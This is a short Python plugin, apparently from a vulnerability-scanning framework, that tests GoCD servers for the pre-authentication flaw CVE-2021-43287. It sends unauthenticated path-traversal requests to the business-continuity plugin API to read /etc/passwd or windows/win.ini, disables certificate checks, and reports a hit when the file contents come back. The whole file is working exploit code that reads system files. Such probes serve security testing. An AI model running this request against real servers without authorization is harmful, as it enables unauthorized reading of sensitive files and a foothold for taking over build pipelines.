#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  '',

      'huixian'   :  '',

      'method'    :   'get',

      'bugname'   :   'Pre-Auth Takeover of Build Pipelines in GoCD CVE-2021-43287',

      'level'     :   'medium',

      'FOFA'      :   '',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  targets = ['/go/add-on/business-continuity/api/plugin?folderName=&pluginName=../../../../../../../../etc/passwd','/go/add-on/business-continuity/api/plugin?folderName=&pluginName=../../../../../../../../windows/win.ini']
  url1 = url + targets[0]
  url2 = url + targets[1]
  # ret['url'] = url1
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if res.status_code == 200 and re.search(r'root:.*?:[0-9]*:[0-9]*:',res.text,re.S):
      ret['url'] = url1
      # ret['huixian'] = res.text
      ret['ifbug'] = True
      res.close()
      return ret
  except:
    pass
  try:
    resp=requests.get(url=url2,headers=headers,timeout=5,verify=False)
    if resp.status_code == 200 and "for 16-bit app support" in resp.text:
      ret['url'] = url2
      # ret['huixian'] = res.text
      resp.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret